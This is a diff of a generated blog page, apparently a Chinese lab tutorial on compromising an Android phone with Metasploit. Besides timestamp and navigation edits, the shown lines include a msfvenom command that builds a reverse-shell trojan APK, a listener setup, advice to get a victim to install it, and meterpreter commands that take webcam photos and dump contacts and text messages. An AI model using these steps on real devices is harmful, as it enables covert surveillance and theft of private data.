@@ -116,7 +116,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/sms.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/sms2.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/app.png">
-<meta property="og:updated_time" content="2019-11-18T06:20:02.458Z">
+<meta property="og:updated_time" content="2019-11-18T06:22:39.983Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用msf渗透Android手机">
 <meta name="twitter:description" content="实验环境Kali:172.16.28.153Android:172.16.28.158">
@@ -453,7 +453,7 @@
                 
               
 
-              <time title="创建时间：2019-11-18 13:48:18 / 修改时间：14:20:02" itemprop="dateCreated datePublished" datetime="2019-11-18T13:48:18+08:00">2019-11-18</time>
+              <time title="创建时间：2019-11-18 13:48:18 / 修改时间：14:22:39" itemprop="dateCreated datePublished" datetime="2019-11-18T13:48:18+08:00">2019-11-18</time>
             
 
             
@@ -496,7 +496,8 @@
 <p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p>
 <p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
-<p>然后想办法让受害者点击这个木马apk<br><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p>
+<p>想办法让受害者点击这个木马apk，这里没有做免杀，手机肯定会报出病毒的警告</p>
+<p><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p>
 <p>我们会拿到一个meterpreter，这里可以输入 help/? 来查看我们能够输入的命令<br><img src="/2019/11/18/利用msf渗透Android手机/core.png" alt></p>
 <p>我们来测试几条经常使用的命令：<br>check_root //检测是否为root权限<br><img src="/2019/11/18/利用msf渗透Android手机/root.png" alt></p>
 <p>webcam_snap    //通过摄像头拍照<br><img src="/2019/11/18/利用msf渗透Android手机/snap.png" alt></p>
@@ -504,7 +505,7 @@
 <p>dump_contacts    //导出通讯录<br><img src="/2019/11/18/利用msf渗透Android手机/concat.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/contact.png" alt></p>
 <p>dump_sms    //导出短信内容<br><img src="/2019/11/18/利用msf渗透Android手机/sms.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/sms2.png" alt></p>
 <p>app_list    //列出安装的app<br><img src="/2019/11/18/利用msf渗透Android手机/app.png" alt></p>
-<p>还可以实时开启监控</p>
+<p>还可以实时开启监控等命令，这里就不一一研究了</p>
 
       
     </div>
@@ -550,6 +551,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/20/Thinkphp5-insert注入/" rel="prev" title="Thinkphp5-insert注入">
+                Thinkphp5-insert注入 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -619,7 +624,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">50</span>
+                    <span class="site-state-item-count">51</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
